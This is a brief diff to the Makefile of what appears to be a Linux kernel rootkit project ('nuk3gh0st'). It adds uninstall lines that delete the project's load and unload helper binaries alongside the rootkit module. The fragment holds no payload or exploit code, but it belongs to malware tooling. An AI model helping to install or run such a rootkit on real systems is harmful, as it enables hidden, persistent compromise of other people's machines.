@@ -17,6 +17,8 @@ install:
 uninstall:
 	rm /usr/bin/nuk3gh0st
 	rm /usr/lib/rootkit.ko
+	rm /usr/bin/load-nuk3gh0st
+	rm /usr/bin/unload-nuk3gh0st
 startup:
 	chmod +x startup.sh
 	./startup.sh
